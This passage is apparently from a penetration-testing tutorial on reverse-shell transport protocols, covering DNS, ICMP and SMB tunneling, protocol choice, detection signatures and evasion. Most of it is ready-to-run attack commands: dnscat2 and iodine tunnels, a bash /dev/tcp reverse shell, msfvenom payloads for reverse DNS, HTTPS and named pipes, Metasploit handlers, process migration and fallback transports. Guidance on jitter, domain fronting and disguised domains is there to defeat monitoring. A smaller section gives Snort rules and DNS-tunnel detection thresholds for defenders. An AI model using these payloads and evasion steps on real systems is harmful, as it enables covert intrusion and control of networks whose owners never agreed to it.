  │  check-in   │────────────▶│          │              │             │
  │  Send cmd   │  (TXT/CNAME │          │  ④ Response │             │
  │  in response│   with cmd) │          │─────────────▶│  Decode     │
  │             │             │          │              │  command    │
  │             │             │          │              │  Execute    │
  │             │             │          │              │             │
  │             │             │          │  ⑤ DNS Query │             │
  │             │             │          │◄─────────────│  Encode     │
  │             │             │          │              │  output as  │
  │  Decode     │  ⑥ Forward │          │              │  multiple   │
  │  output     │◄────────────│          │              │  subdomain  │
  │             │             │          │              │  queries    │
  │             │             │          │              │             │
  │     ┌─── Extremely slow — each query carries ~200 bytes ───┐   │
  │             │             │          │              │             │
  └─────────────┘             └──────────┘              └─────────────┘


  DNS QUERY FORMAT:
  ┌──────────────────────────────────────────────────────────┐
  │                                                          │
  │  Normal DNS:                                             │
  │    www.google.com → 142.250.80.46                       │
  │                                                          │
  │  DNS Tunnel:                                             │
  │    d2hvYW1p.data.evil.com → TXT "cm9vdA=="              │
  │    ^^^^^^^^                     ^^^^^^^^^^               │
  │    Base32 encoded               Base64 encoded           │
  │    data ("whoami")              response ("root")        │
  │                                                          │
  └──────────────────────────────────────────────────────────┘
```

### What It Looks Like on the Wire

```text [Packet Capture — Reverse DNS]

  No.  Time      Source          Dest            Protocol  Info
  ───  ────      ──────          ────            ────────  ────
  1    0.000     192.168.1.100   8.8.8.8         DNS       Standard query A d2hvYW1p.c2Vzc2lvbg.data.evil.com
  2    0.150     8.8.8.8         192.168.1.100   DNS       Standard response CNAME → attacker NS
  3    0.300     192.168.1.100   10.10.10.5      DNS       Standard query A d2hvYW1p.c2Vzc2lvbg.data.evil.com
  4    0.500     10.10.10.5      192.168.1.100   DNS       Standard response TXT "cm9vdA=="
  5    5.000     192.168.1.100   8.8.8.8         DNS       Standard query A a2Q.c2Vzc2lvbg.data.evil.com
  6    5.200     10.10.10.5      192.168.1.100   DNS       Standard response TXT "dWlkPTAocm9vdCk="
  ...

  ✅  Port 53 — DNS traffic, almost never blocked
  ✅  Looks like normal DNS resolution
  ⚠️  Unusual number of DNS queries to a single domain
  ⚠️  Subdomain names look like random/encoded strings
  ⚠️  TXT record responses are unusual for regular browsing
  ⚠️  Very slow — each query carries tiny amounts of data
```

### DNS Query Encoding Detail

```text [How Data Is Encoded in DNS]

  Command to send: "cat /etc/passwd"
  ┌────────────────────────────────────┐
  │ 1. Encode: Base32("cat /etc/passwd")          │
  │    = "MNQXIIDUNBSSA43UOMQHG5DFON2A"          │
  │                                                │
  │ 2. Split into labels (max 63 chars each):     │
  │    MNQXIIDUNBSSA.43UOMQHG5DFON2A             │
  │                                                │
  │ 3. Append tunnel domain:                       │
  │    MNQXIIDUNBSSA.43UOMQHG5DFON2A.t.evil.com  │
  │                                                │
  │ 4. Send as DNS query:                          │
  │    dig A MNQXIIDUNBSSA.43UOMQHG5DFON2A.t.evil.com │
  │                                                │
  │ 5. Attacker's DNS server:                      │
  │    - Receives the query                        │
  │    - Strips the tunnel domain                  │
  │    - Decodes Base32                            │
  │    - Gets: "cat /etc/passwd"                   │
  │    - Executes command                          │
  │    - Encodes output into TXT response          │
  └────────────────────────────────────┘

  DNS RECORD TYPES USED FOR TUNNELING:
  ┌────────────────────────────────────┐
  │ A Record      — 4 bytes per response (IPv4 address)     │
  │ AAAA Record   — 16 bytes per response (IPv6 address)    │
  │ TXT Record    — ~255 bytes per response (most common)   │
  │ CNAME Record  — ~253 bytes per response                 │
  │ MX Record     — ~253 bytes per response                 │
  │ NULL Record   — ~65535 bytes (rarely supported)         │
  └────────────────────────────────────┘
```

### Firewall Perspective

```text [Firewall — Reverse DNS]

  TARGET MACHINE FIREWALL
  ┌───────────────────────────────────────────────────────────────┐
  │                                                               │
  │  OUTBOUND RULES                                               │
  │  ┌──────────────────────────────────────────┐                │
  │  │ Port 80  (HTTP)  → BLOCKED ❌            │                │
  │  │ Port 443 (HTTPS) → BLOCKED ❌            │                │
  │  │ Port 53  (DNS)   → ALLOW   ✅            │                │
  │  │ All other        → BLOCKED ❌            │                │
  │  └──────────────────────────────────────────┘                │
  │                                                               │
  │  Even the MOST restrictive firewall allows DNS (port 53)     │
  │  because without DNS, nothing works — no browsing, no email, │
  │  no updates, nothing.                                         │
  │                                                               │
  │  Reverse TCP?    ❌ BLOCKED                                   │
  │  Reverse HTTP?   ❌ BLOCKED                                   │
  │  Reverse HTTPS?  ❌ BLOCKED                                   │
  │  Reverse DNS?    ✅ ALLOWED  ← The only way out              │
  │                                                               │
  │  DETECTION CHALLENGE:                                         │
  │  ┌──────────────────────────────────────────┐                │
  │  │ DNS traffic is HIGH VOLUME on any network│                │
  │  │ Thousands of queries per minute normally │                │
  │  │ Tunnel queries hide in the noise          │                │
  │  │ Requires DNS-specific analytics to detect│                │
  │  └──────────────────────────────────────────┘                │
  │                                                               │
  └───────────────────────────────────────────────────────────────┘
```

### Usage

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="dnscat2"}
  ```bash [Attacker — Start DNS Server]
  # Install
  git clone https://github.com/iagox86/dnscat2.git
  cd dnscat2/server
  gem install bundler
  bundle install

  # Start server (requires domain you control)
  ruby dnscat2.rb tunnel.yourdomain.com
  ```

  ```bash [Target — Connect]
  # Compile client
  cd dnscat2/client
  make

  # Connect
  ./dnscat tunnel.yourdomain.com
  ```

  ```bash [Attacker — Interact]
  # In dnscat2 server console
  dnscat2> sessions
  dnscat2> session -i 1
  command (session1) > shell
  command (session1) > session -i 2
  sh$ whoami
  root
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="iodine"}
  ```bash [Attacker — DNS Tunnel Server]
  # Create a full IP-over-DNS tunnel
  sudo iodined -f -c -P secretpassword 10.0.0.1/24 tunnel.yourdomain.com
  ```

  ```bash [Target — DNS Tunnel Client]
  sudo iodine -f -P secretpassword tunnel.yourdomain.com
  # Creates a virtual interface with IP 10.0.0.2
  # You can now SSH, HTTP, anything through the DNS tunnel
  ```

  ```bash [Attacker — Use the Tunnel]
  # SSH through DNS tunnel
  ssh user@10.0.0.2

  # Or set up a reverse shell through the tunnel
  # Target:
  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
  # Attacker:
  nc -lvnp 4444
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Metasploit DNS"}
  ```bash [Payload Generation]
  msfvenom -p windows/x64/meterpreter/reverse_dns \
    LHOST=10.10.10.5 LPORT=53 \
    -f exe -o reverse_dns.exe
  ```

  ```bash [Handler]
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_dns
  set LHOST 0.0.0.0
  set LPORT 53
  exploit -j
  ```
  :::
::

### Pros & Cons

::field-group
  ::field{name="Nearly impossible to block" type="pro"}
  DNS is required for virtually all network operations. Blocking port 53 breaks the entire network. DNS tunneling exploits this fundamental dependency.
  ::

  ::field{name="Bypasses the most restrictive firewalls" type="pro"}
  When HTTP, HTTPS, and all other ports are blocked, DNS is often the only way out. It is the last resort that almost always works.
  ::

  ::field{name="Hides in normal traffic volume" type="pro"}
  Networks generate thousands of DNS queries per minute. Tunnel queries blend into the noise, making detection require specialized DNS analytics.
  ::

  ::field{name="Extremely slow" type="con"}
  Each DNS query carries approximately 200 bytes of data. Transferring a 1 MB file takes thousands of queries. Interactive commands feel painfully sluggish.
  ::

  ::field{name="Detectable with DNS analytics" type="con"}
  Unusual query patterns — high volume to a single domain, long subdomain names, frequent TXT record requests — can be flagged by DNS monitoring tools like Passive DNS or DNS firewalls.
  ::

  ::field{name="Requires domain infrastructure" type="con"}
  You need a domain you control with authoritative DNS configured to point to your server. More setup than other protocols.
  ::

  ::field{name="UDP reliability issues" type="con"}
  DNS primarily uses UDP which does not guarantee delivery. Packet loss means lost data. DNS tunneling tools must implement their own reliability layer.
  ::
::

---

## Exotic Protocols

When the standard protocols are blocked or monitored, creative operators use unconventional channels.

### Reverse ICMP

```text [Reverse ICMP — Connection Flow]

  ATTACKER                                    TARGET
  ┌─────────────────┐                         ┌─────────────────┐
  │                 │                         │                 │
  │  ICMP Listener  │                         │  Payload        │
  │                 │                         │                 │
  │                 │  ① ICMP Echo Request   │                 │
  │                 │◄────────────────────────│  Data encoded   │
  │                 │  (Payload data hidden   │  in ICMP data   │
  │                 │   in ICMP data field)   │  field          │
  │                 │                         │                 │
  │  Decode data    │  ② ICMP Echo Reply     │                 │
  │  Send command   │────────────────────────▶│  Command in     │
  │  in reply       │  (Command in reply      │  reply data     │
  │                 │   data field)           │                 │
  │                 │                         │                 │
  └─────────────────┘                         └─────────────────┘

  Looks like: Normal ping traffic
  Reality: Bidirectional data channel
  Tool: icmpsh, ptunnel, hans
```

::code-group
  ```bash [icmpsh — Attacker (Listener)]
  # Disable kernel ICMP replies (we handle them ourselves)
  sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

  # Start listener
  python3 icmpsh_m.py ATTACKER_IP TARGET_IP
  ```

  ```bash [icmpsh — Target (Windows)]
  icmpsh.exe -t ATTACKER_IP
  ```

  ```bash [ptunnel — Full TCP-over-ICMP Tunnel]
  # Attacker (proxy server)
  sudo ptunnel-ng -s

  # Target (proxy client — tunnel SSH through ICMP)
  sudo ptunnel-ng -p ATTACKER_IP -l 8022 -r 127.0.0.1 -R 22

  # Now SSH via the ICMP tunnel
  ssh user@127.0.0.1 -p 8022
  ```
::

### Reverse SMB (Named Pipes)

```text [Reverse SMB — Connection Flow]

  ATTACKER                                    TARGET
  ┌─────────────────┐                         ┌─────────────────┐
  │                 │                         │                 │
  │  SMB Listener   │                         │  Payload        │
  │  Port 445       │                         │                 │
  │                 │  ① SMB Connection      │                 │
  │                 │◄────────────────────────│  Connects to    │
  │                 │                         │  attacker SMB   │
  │                 │  ② Named Pipe Created  │                 │
  │                 │◄───────────────────────▶│  \\ATTACKER\    │
  │                 │  (\\pipe\meterpreter)   │  pipe\payload   │
  │                 │                         │                 │
  │  Commands flow  │  ③ Bidirectional Data  │                 │
  │  through the    │◄───────────────────────▶│  Data through   │
  │  named pipe     │  via SMB named pipe     │  named pipe     │
  │                 │                         │                 │
  └─────────────────┘                         └─────────────────┘

  Looks like: Normal Windows file sharing traffic
  Best for: Internal networks where SMB traffic is expected
```

```bash [msfvenom — Reverse Named Pipe]
msfvenom -p windows/x64/meterpreter/reverse_named_pipe \
  PIPEHOST=10.10.10.5 PIPENAME=mypipe \
  -f exe -o reverse_pipe.exe
```

### Comparison of Exotic Protocols

| Protocol | Port | Speed | Stealth | Use Case |
| -------- | ---- | ----- | ------- | -------- |
| ICMP | N/A (protocol 1) | Slow | High | When TCP/UDP is blocked |
| SMB Named Pipe | 445 | Fast | High (internal) | Active Directory networks |
| WebSocket | 80/443 | Fast | Very High | Modern web applications |
| gRPC | 443 | Fast | Very High | Cloud-native environments |

---

## Protocol Selection Decision Tree

Use this flowchart to choose the right protocol for your engagement.

```text [Protocol Selection Flowchart]

  START: I need a reverse shell
  │
  ├── Is this a lab / CTF / internal with no filtering?
  │   ├── YES → Use Reverse TCP (fastest, simplest)
  │   │         Port: 4444 or any available
  │   │         Listener: nc -lvnp 4444
  │   └── NO  → Continue ↓
  │
  ├── Is outbound port 443 (HTTPS) allowed?
  │   ├── YES → Use Reverse HTTPS (best balance of stealth + speed)
  │   │         Port: 443
  │   │         Listener: Metasploit multi/handler
  │   │
  │   │         ├── Is there SSL inspection?
  │   │         │   ├── YES → Use certificate pinning + domain fronting
  │   │         │   └── NO  → Standard HTTPS payload works
  │   │
  │   └── NO  → Continue ↓
  │
  ├── Is outbound port 80 (HTTP) allowed?
  │   ├── YES → Use Reverse HTTP
  │   │         Port: 80
  │   │         Listener: Metasploit multi/handler
  │   │
  │   │         ├── Is there an HTTP proxy?
  │   │         │   ├── YES → Configure proxy settings in payload
  │   │         │   └── NO  → Standard HTTP payload works
  │   │
  │   └── NO  → Continue ↓
  │
  ├── Is outbound DNS (port 53) allowed?
  │   ├── YES → Use Reverse DNS (slow but reliable)
  │   │         Tool: dnscat2 or iodine
  │   │         Requires: Domain you control
  │   └── NO  → Continue ↓
  │
  ├── Is ICMP (ping) allowed?
  │   ├── YES → Use Reverse ICMP
  │   │         Tool: icmpsh or ptunnel
  │   └── NO  → Continue ↓
  │
  ├── Is this an internal AD network?
  │   ├── YES → Try Reverse SMB (Named Pipes)
  │   │         Port: 445 (usually allowed internally)
  │   └── NO  → Continue ↓
  │
  └── ALL outbound blocked?
      └── Look for:
          - Allowed web applications you can abuse as C2 channels
          - Cloud services (Slack, Teams, Discord bots)
          - Approved software with network access
          - Physical exfiltration methods
          - Accept that network access may not be possible
```

## Detection Signatures

Understanding how each protocol is detected helps you both **evade** detection (as an attacker) and **implement** detection (as a defender writing your report).

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Reverse TCP Detection"}
  | Indicator | What Blue Team Sees | Detection Method |
  | --------- | ------------------- | ---------------- |
  | Non-standard port | Outbound TCP to port 4444, 5555, etc. | Firewall logs, Netflow |
  | Long-lived connection | Single TCP session lasting hours | Connection duration analysis |
  | Bidirectional data | Interactive data flow on unusual port | Traffic pattern analysis |
  | Meterpreter signature | Known byte patterns in initial handshake | IDS signature matching (Snort/Suricata) |
  | Process behavior | `cmd.exe` / `/bin/sh` spawned by unusual parent | EDR process tree analysis |

  ```text [Snort Rule — Reverse TCP]
  alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:"Possible Meterpreter Reverse TCP"; 
  flow:established,to_server; content:"|00 00 00|"; depth:4; sid:1000001; rev:1;)
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Reverse HTTP Detection"}
  | Indicator | What Blue Team Sees | Detection Method |
  | --------- | ------------------- | ---------------- |
  | Beaconing pattern | Regular HTTP requests every N seconds | Time-series analysis, RITA |
  | Unusual User-Agent | Default Metasploit UA or known C2 UA | HTTP header inspection |
  | Unknown domain | HTTP traffic to newly registered domain | Domain reputation, threat intel |
  | URL patterns | Meterpreter URI checksum patterns | Deep packet inspection |
  | POST with encoded data | Large encoded POST bodies to unusual endpoints | Content inspection |

  ```text [Snort Rule — Meterpreter HTTP]
  alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Meterpreter HTTP Beacon";
  flow:established,to_server; content:"GET"; http_method; 
  pcre:"/^\/[A-Za-z0-9_-]{4,}\/?$/U"; content:"User-Agent|3a|"; 
  sid:1000002; rev:1;)
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Reverse HTTPS Detection"}
  | Indicator | What Blue Team Sees | Detection Method |
  | --------- | ------------------- | ---------------- |
  | Self-signed certificate | TLS cert not issued by trusted CA | Certificate inspection |
  | Unusual SNI | TLS SNI to unknown or suspicious domain | TLS metadata analysis |
  | Beaconing pattern | Regular HTTPS connections at fixed intervals | JA3/JA3S fingerprinting |
  | Certificate mismatch | Cert CN does not match domain | Certificate transparency logs |
  | JA3 fingerprint | Known Meterpreter/Cobalt Strike TLS fingerprint | JA3 hash matching |

  ```text [JA3 Fingerprint Detection]
  # Meterpreter default JA3 hash (example — changes with versions)
  # Match against known C2 JA3 databases
  ja3_hash = "72a589da586844d7f0818ce684948eea"
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Reverse DNS Detection"}
  | Indicator | What Blue Team Sees | Detection Method |
  | --------- | ------------------- | ---------------- |
  | High query volume | Excessive DNS queries to single domain | DNS query frequency analysis |
  | Long subdomain names | Queries with unusually long subdomain labels | DNS query length analysis |
  | Entropy analysis | Subdomain strings have high entropy (random-looking) | Shannon entropy calculation |
  | TXT record abuse | Frequent TXT record requests (unusual for browsing) | DNS record type analysis |
  | Direct DNS | Queries going to non-standard DNS servers | DNS destination monitoring |

  ```text [DNS Tunnel Detection Thresholds]
  ALERT if:
    - Single domain receives > 100 queries/minute
    - Average subdomain length > 40 characters
    - Shannon entropy of subdomain > 3.5
    - TXT query ratio > 10% of total DNS queries
    - DNS payload size > 512 bytes consistently
  ```
  :::
::

## Protocol Hardening — Making Your Shell Survive

::accordion
  :::accordion-item{icon="i-lucide-shield-check" label="Use Encrypted Channels (Always)"}
  ```text [Encryption Priority]
  BEST:   Reverse HTTPS with certificate pinning + domain fronting
  GOOD:   Reverse HTTPS with self-signed certificate
  OKAY:   Reverse HTTP (at least traverses proxies)
  BAD:    Reverse TCP (plaintext, easily detected)

  On real engagements: ALWAYS use Reverse HTTPS minimum.
  Reverse TCP is for labs only.
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-check" label="Jitter Your Beaconing"}
  Regular polling intervals (exactly every 5 seconds) create a detectable pattern. Add randomness.

  ```text [Beaconing with Jitter]
  WITHOUT JITTER (detectable):
  ──●─────●─────●─────●─────●─────●─────●──
    5s    5s    5s    5s    5s    5s    5s

  WITH JITTER (harder to detect):
  ──●───●───────●──●────────●───●──────●──
    3s  7s      2s 8s       4s  6s     5s

  Configure in Meterpreter:
  meterpreter > transport set-timeouts -cs 5 -cj 50
  # -cs 5  = sleep 5 seconds between callbacks
  # -cj 50 = 50% jitter (sleep will be 2.5s to 7.5s randomly)
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-check" label="Use Legitimate-Looking Infrastructure"}
  ```text [Infrastructure Levels]

  LEVEL 0 — Script Kiddie:
    Payload connects to raw IP: 10.10.10.5:4444
    ❌ Instantly suspicious

  LEVEL 1 — Basic:
    Register a domain, point it to your IP
    Payload connects to: updates.security-patch.com:443
    ⚠️ Suspicious if domain is new / unrated

  LEVEL 2 — Professional:
    Registered domain with history
    Let's Encrypt certificate
    Payload connects to: cdn-assets.legitimate-site.com:443
    ✅ Harder to distinguish from real traffic

  LEVEL 3 — Advanced (Red Team):
    Domain fronting through CDN (Cloudflare, AWS CloudFront)
    Traffic appears to go to: www.microsoft.com
    Actually routes to: your C2 server
    ✅✅ Extremely difficult to detect without deep inspection
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-check" label="Configure Multiple Transport Channels"}
  If your primary channel dies, fall back to a secondary.

  ```bash [Metasploit — Multiple Transports]
  # After getting meterpreter session:
  meterpreter > transport list

  # Add backup HTTP transport
  meterpreter > transport add -t reverse_http -l ATTACKER_IP -p 80

  # Add backup DNS transport
  meterpreter > transport add -t reverse_dns -l ATTACKER_IP -p 53

  # Set failover order
  meterpreter > transport next

  # Transport chain:
  # 1. HTTPS (primary) → if blocked →
  # 2. HTTP (fallback) → if blocked →
  # 3. DNS (last resort)
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-check" label="Change Default Ports"}
  ```text [Port Selection Strategy]

  NEVER USE:
    4444 — Metasploit default (flagged by every IDS)
    1234 — Obvious non-standard port
    31337 — "eleet" port (flagged)
    6666-6669 — IRC ports (flagged)

  ALWAYS USE:
    443  — HTTPS (best choice, blends with web traffic)
    80   — HTTP (second best)
    8080 — HTTP alternate (common for web apps)
    8443 — HTTPS alternate

  CREATIVE OPTIONS:
    53   — DNS (if using DNS tunnel)
    587  — SMTP submission (if email traffic is normal)
    993  — IMAPS (if email traffic is normal)
    3306 — MySQL (if DB traffic is expected)
  ```
  :::
::

## Real-World Engagement Workflow

::steps{level="3"}

### Phase 1 — Determine Egress Rules

Before generating any payload, understand what the target network allows outbound.

```bash [From Initial Access (Web Shell / Limited Shell)]
# Test outbound connectivity on common ports
for port in 80 443 53 8080 8443 4444; do
  (echo test > /dev/tcp/YOUR_VPS_IP/$port) 2>/dev/null && echo "Port $port: OPEN" || echo "Port $port: BLOCKED"
done
```

```bash [From Outside — Probe with Nmap]
# Check what the target's firewall allows outbound
# (requires initial access to trigger outbound connections)
nmap -sT -Pn -p 80,443,53,8080,8443 YOUR_VPS_IP
```

### Phase 2 — Select Protocol and Generate Payload

Based on what is allowed:

::code-group
  ```bash [If 443 Allowed (Best Case)]
  msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=your-domain.com LPORT=443 \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    HandlerSSLCert=server.pem \
    StagerVerifySSLCert=true \
    -f exe -o payload.exe
  ```

  ```bash [If Only 80 Allowed]
  msfvenom -p windows/x64/meterpreter/reverse_http \
    LHOST=your-domain.com LPORT=80 \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -f exe -o payload.exe
  ```

  ```bash [If Only DNS Allowed (Worst Case)]
  # Set up dnscat2 server
  ruby dnscat2.rb tunnel.yourdomain.com
  # Deploy dnscat2 client on target
  ```
::

### Phase 3 — Start Listener and Deliver

```bash [msf6>]
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set HandlerSSLCert /opt/certs/server.pem
set StagerVerifySSLCert true
set SessionCommunicationTimeout 0
set ExitOnSession false
exploit -j
```

### Phase 4 — Verify and Stabilize

```bash [meterpreter>]
# Verify connection
sysinfo
getuid

# Migrate to stable process
migrate -N explorer.exe

# Set up transport fallbacks
transport add -t reverse_http -l your-domain.com -p 80
transport add -t reverse_dns -l your-domain.com -p 53

# Configure sleep and jitter
transport set-timeouts -cs 10 -cj 40
```

::

## Quick Reference Card

::collapsible

| Protocol | Payload (msfvenom -p) | Port | Listener Type | One-Liner Available |
| -------- | --------------------- | ---- | ------------- | ------------------- |
| Reverse TCP | `windows/x64/meterpreter/reverse_tcp` | Any | Netcat / Metasploit | :icon{name="i-lucide-check"} Yes |
| Reverse TCP (Stageless) | `windows/x64/shell_reverse_tcp` | Any | Netcat / Any | :icon{name="i-lucide-check"} Yes |
| Reverse HTTP | `windows/x64/meterpreter/reverse_http` | 80 | Metasploit only | :icon{name="i-lucide-x"} No |
| Reverse HTTPS | `windows/x64/meterpreter/reverse_https` | 443 | Metasploit only | :icon{name="i-lucide-x"} No |
| Reverse DNS | `windows/x64/meterpreter/reverse_dns` | 53 | Metasploit / dnscat2 | :icon{name="i-lucide-x"} No |
| Bind TCP | `windows/x64/meterpreter/bind_tcp` | Any | Metasploit (connect to target) | :icon{name="i-lucide-check"} Yes |
| Reverse Named Pipe | `windows/x64/meterpreter/reverse_named_pipe` | 445 | Metasploit only | :icon{name="i-lucide-x"} No |

::

::tip
**The protocol is the highway. The payload is the vehicle.** The same Meterpreter payload can travel over TCP, HTTP, HTTPS, or DNS — the capabilities after landing are identical. But the highway you choose determines whether you arrive safely or get pulled over at the first checkpoint.

Choose your highway wisely. :icon{name="i-lucide-route"}
::